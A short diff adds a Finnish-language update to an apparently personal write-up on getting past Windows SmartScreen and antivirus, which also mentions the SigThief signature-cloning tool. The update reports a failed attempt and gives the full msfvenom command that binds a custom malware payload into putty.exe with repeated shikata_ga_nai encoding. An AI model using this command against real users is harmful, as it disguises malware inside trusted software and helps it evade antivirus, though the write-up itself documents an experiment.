@@ -252,6 +252,13 @@ Tämä ei tuottanut tulosta ainakaan SteamSetup.exe:stä otetulla signaturella. 
 SigThiefin repository löytyy täältä: https://github.com/secretsquirrel/SigThief
 
 
+### Päivitys 05.11.2018
+
+Koitin lisätä haittaohjelman puttyyn kiinni, jos olisin päässyt smartscreenistä ohi sen tiedoilla ratsastamalla. Käytin myös shikata_ga_nai enkoodausta.  
+Valitettavasti smartscreen huomasi kuitenkin tämän ratsastuksen ja silti pyöritettäessä sekä avast, että kaspersky havaitsi myös generic/custom payloadin exessä ja esti sen.  
+Komento jota koitin käyttää ohittamiseen:
+```
+sudo msfvenom --payload generic/custom PAYLOADFILE=/home/anon/haittaohjelma/varasPerus.exe -a x64 --template putty.exe --keep -f exe -e x86/shikata_ga_nai -i 56 --out puttyVaras.exe```
 
 
 
